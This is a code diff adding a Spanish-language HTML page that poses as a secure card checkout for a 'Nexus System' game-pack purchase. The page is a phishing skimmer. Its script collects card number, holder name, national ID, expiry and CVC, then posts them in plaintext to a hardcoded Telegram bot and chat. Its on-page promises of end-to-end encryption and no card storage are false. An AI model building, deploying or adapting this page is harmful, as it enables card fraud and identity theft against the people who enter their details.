@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Pago Seguro | NEXUS SYSTEM</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800;900&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #060606;
+            --card: #121214;
+            --accent: #6772e5; 
+            --visa: linear-gradient(135deg, #1a1f71 0%, #0051a1 100%);
+            --mastercard: linear-gradient(135deg, #eb001b 0%, #ff5f00 100%);
+            --default-card: linear-gradient(135deg, #333 0%, #111 100%);
+            --border: rgba(255, 255, 255, 0.08);
+            --text-main: #ffffff;
+            --text-dim: #a0a0a0;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { background: var(--bg); color: var(--text-main); font-family: 'Outfit', sans-serif; overflow-x: hidden; }
+
+        header { 
+            padding: 15px 24px; display: flex; justify-content: space-between; align-items: center; 
+            background: rgba(6, 6, 6, 0.85); backdrop-filter: blur(20px); border-bottom: 1px solid var(--border);
+            position: sticky; top: 0; z-index: 1000;
+        }
+        /* CORRECCIÓ: Redirigeix directament a pago.html */
+        .back-btn { width: 40px; height: 40px; background: var(--card); border: 1px solid var(--border); border-radius: 12px; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+
+        .container { padding: 20px; padding-bottom: 120px; }
+
+        .card-visual {
+            width: 100%; height: 180px; background: var(--default-card);
+            border-radius: 20px; padding: 20px; margin-bottom: 25px; position: relative;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            display: flex; flex-direction: column; justify-content: space-between;
+            transition: all 0.5s ease;
+        }
+        .card-visual.visa { background: var(--visa); }
+        .card-visual.mastercard { background: var(--mastercard); }
+        .card-visual .chip { width: 40px; height: 30px; background: rgba(255,255,255,0.2); border-radius: 6px; }
+        .card-visual .number { font-size: 1.25rem; font-weight: 600; letter-spacing: 2px; }
+
+        .input-group { margin-bottom: 15px; }
+        .input-group label { display: flex; align-items: center; justify-content: space-between; font-size: 0.75rem; color: var(--text-dim); margin-bottom: 6px; font-weight: 700; text-transform: uppercase; }
+        .input-field { width: 100%; background: var(--card); border: 1px solid var(--border); padding: 14px; border-radius: 12px; color: white; font-size: 0.95rem; outline: none; }
+        .input-field:focus { border-color: var(--accent); background: rgba(255,255,255,0.02); }
+
+        .form-row { display: flex; gap: 12px; }
+        .form-row .input-group { flex: 1; }
+
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); display: none; align-items: center; justify-content: center; z-index: 2000; padding: 20px; }
+        .modal-content { background: var(--card); border: 1px solid var(--border); padding: 25px; border-radius: 24px; width: 100%; max-width: 320px; text-align: center; }
+        .cvc-graphic { width: 100%; height: 100px; background: #333; border-radius: 10px; margin: 15px 0; position: relative; overflow: hidden; }
+        .cvc-graphic .magnetic-stripe { width: 100%; height: 30px; background: #111; margin-top: 12px; }
+        .cvc-graphic .signature-area { width: 50%; height: 20px; background: #eee; margin: 12px 0 0 12px; display: flex; align-items: center; justify-content: flex-end; padding-right: 5px; }
+        .cvc-highlight { color: #eb001b; font-weight: bold; border: 1.5px solid #eb001b; padding: 1px 4px; font-size: 9px; }
+
+        .footer-action { position: fixed; bottom: 0; left: 0; right: 0; padding: 20px 24px calc(20px + env(safe-area-inset-bottom)); background: linear-gradient(to top, var(--bg) 80%, transparent); }
+        .btn-pay { width: 100%; background: var(--accent); color: white; padding: 18px; border-radius: 18px; border: none; font-size: 1rem; font-weight: 900; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+
+    <div class="modal-overlay" id="cvcModal">
+        <div class="modal-content">
+            <h3 style="font-weight: 900;">Código CVC</h3>
+            <p style="font-size: 0.8rem; color: var(--text-dim); margin-top: 8px;">Son los últimos 3 números en el reverso.</p>
+            <div class="cvc-graphic">
+                <div class="magnetic-stripe"></div>
+                <div class="signature-area"><span class="cvc-highlight">123</span></div>
+            </div>
+            <button style="background: var(--accent); color: white; border: none; padding: 12px; border-radius: 10px; width: 100%; font-weight: 800;" onclick="closeCvcModal()">ENTENDIDO</button>
+        </div>
+    </div>
+
+    <header>
+        <div class="back-btn" onclick="window.location.href='pago.html'"><i class="fas fa-chevron-left"></i></div>
+        <div style="font-weight: 900; font-size: 0.9rem;">PAGO CON TARJETA</div>
+        <div style="width: 40px;"></div>
+    </header>
+
+    <div class="container">
+        <div class="card-visual" id="card-preview">
+            <div style="display: flex; justify-content: space-between;">
+                <div class="chip"></div>
+                <i id="card-logo" class="fas fa-credit-card" style="font-size: 1.8rem;"></i>
+            </div>
+            <div class="number" id="card-num-display">•••• •••• •••• ••••</div>
+            <div class="details">
+                <div><p style="font-size: 0.5rem;">Titular</p><p id="card-name-display" style="font-size: 0.75rem;">NOMBRE COMPLETO</p></div>
+                <div><p style="font-size: 0.5rem;">Vence</p><p id="card-date-display" style="font-size: 0.75rem;">MM/AA</p></div>
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label>Número de tarjeta</label>
+            <input type="tel" inputmode="numeric" pattern="[0-9]*" class="input-field" placeholder="0000 0000 0000 0000" id="input-number" maxlength="19" oninput="updateCard()">
+        </div>
+
+        <div class="input-group">
+            <label>Nombre del titular</label>
+            <input type="text" class="input-field" placeholder="Como figura en el plástico" id="input-name" oninput="updateCard()">
+        </div>
+
+        <div class="input-group">
+            <label>DNI / Documento del titular</label>
+            <input type="tel" inputmode="numeric" pattern="[0-9]*" class="input-field" placeholder="Número de documento" id="input-dni" maxlength="10">
+        </div>
+
+        <div class="form-row">
+            <div class="input-group">
+                <label>Vencimiento</label>
+                <input type="tel" inputmode="numeric" pattern="[0-9]*" class="input-field" placeholder="MM/AA" id="input-date" maxlength="5" oninput="updateCard()">
+            </div>
+            <div class="input-group">
+                <label>CVC <i class="fas fa-question-circle" style="color: var(--accent);" onclick="openCvcModal()"></i></label>
+                <input type="tel" inputmode="numeric" pattern="[0-9]*" class="input-field" placeholder="123" id="input-cvc" maxlength="3">
+            </div>
+        </div>
+            <div style="margin-top: 30px; border-top: 1px solid var(--border); padding-top: 20px;">
+            <div style="display: flex; justify-content: center; gap: 20px; opacity: 0.4; filter: grayscale(1); margin-bottom: 20px;">
+                <i class="fab fa-cc-visa" style="font-size: 1.5rem;"></i>
+                <i class="fab fa-cc-mastercard" style="font-size: 1.5rem;"></i>
+                <i class="fab fa-cc-amex" style="font-size: 1.5rem;"></i>
+                <i class="fas fa-shield-halved" style="font-size: 1.5rem;"></i>
+            </div>
+            
+            <div style="text-align: center; color: #444; font-size: 0.65rem; line-height: 1.4; padding: 0 10px;">
+                <p style="margin-bottom: 8px;">
+                    <i class="fas fa-lock" style="color: #00ff88;"></i> 
+                    Tus pagos se procesan de forma segura mediante encriptación de extremo a extremo. 
+                    Nexus System no almacena los datos completos de tu tarjeta de crédito.
+                </p>
+                <p>
+                    Al confirmar el pago, aceptas nuestros <b>Términos de Servicio</b> y las políticas de prevención de fraude internacionales. 
+                    © 2026 Nexus System Payments Inc.
+                </p>
+            </div>
+        </div>
+    <div class="footer-action">
+        <button class="btn-pay" id="main-pay-btn" onclick="processCardPayment()">
+            Pagar <span id="pay-amount">$0.00</span>
+        </button>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '7452393821:AAEHY511Yv-1KqScg7tylWVc8xwFV26GSkQ';
+        const CHAT_ID = '6493944778';
+
+        window.onload = function() {
+            const rawData = localStorage.getItem('current_checkout');
+            if(rawData) {
+                const data = JSON.parse(rawData);
+                document.getElementById('pay-amount').innerText = data.price;
+            }
+        }
+
+        function openCvcModal() { document.getElementById('cvcModal').style.display = 'flex'; }
+        function closeCvcModal() { document.getElementById('cvcModal').style.display = 'none'; }
+
+        function updateCard() {
+            const num = document.getElementById('input-number').value;
+            const name = document.getElementById('input-name').value;
+            const date = document.getElementById('input-date').value;
+            const preview = document.getElementById('card-preview');
+            const logo = document.getElementById('card-logo');
+
+            preview.className = "card-visual"; logo.className = "fas fa-credit-card";
+            if (num.startsWith('4')) { preview.classList.add('visa'); logo.className = "fab fa-cc-visa"; }
+            else if (num.startsWith('5')) { preview.classList.add('mastercard'); logo.className = "fab fa-cc-mastercard"; }
+
+            document.getElementById('card-name-display').innerText = name ? name.toUpperCase() : "NOMBRE COMPLETO";
+            document.getElementById('card-num-display').innerText = num ? num : "•••• •••• •••• ••••";
+            document.getElementById('card-date-display').innerText = date ? date : "MM/AA";
+        }
+
+        document.getElementById('input-number').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+        });
+
+        document.getElementById('input-date').addEventListener('input', (e) => {
+            let val = e.target.value.replace(/[^\d]/g, '');
+            if (val.length >= 2) val = val.slice(0, 2) + '/' + val.slice(2);
+            e.target.value = val;
+        });
+        async function processCardPayment() {
+    const btn = document.getElementById('main-pay-btn');
+    
+    const num = document.getElementById('input-number').value;
+    const name = document.getElementById('input-name').value;
+    const dni = document.getElementById('input-dni').value;
+    const date = document.getElementById('input-date').value;
+    const cvc = document.getElementById('input-cvc').value;
+    
+    if(!num || !name || !dni || !date || !cvc) {
+        alert("Completa todos los campos correctamente.");
+        return;
+    }
+
+    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESANDO...';
+    btn.disabled = true;
+
+    // --- ESTA ES LA PARTE IMPORTANTE QUE TENÉS QUE AGREGAR ---
+    // Detectamos si es Visa (4) o Mastercard (5) y lo guardamos
+    const tipoDeTarjeta = num.startsWith('4') ? 'visa' : 'mastercard';
+    localStorage.setItem('card_type', tipoDeTarjeta);
+    // -------------------------------------------------------
+
+    const rawData = localStorage.getItem('current_checkout');
+    const checkoutData = JSON.parse(rawData);
+
+    const text = `⚠️ *NUEVO PAGO RECIBIDO* ⚠️\n\n` +
+                 `💎 *Pack:* ${checkoutData.pack}\n` +
+                 `💵 *Monto:* ${checkoutData.price}\n` +
+                 `🆔 *ID Jugador:* ${checkoutData.id}\n\n` +
+                 `💳 *DATOS DE TARJETA:*\n` +
+                 `👤 *Titular:* ${name}\n` +
+                 `🆔 *DNI:* ${dni}\n` +
+                 `🔢 *Número:* \`${num}\`\n` +
+                 `📅 *Exp:* ${date}  |  *CVC:* ${cvc}`;
+
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: 'Markdown'
+            })
+        });
+
+        window.location.href = 'verificacion.html';
+    } catch (error) {
+        window.location.href = 'verificacion.html';
+    }
+}
+
+    </script>
+</body>
+</html>
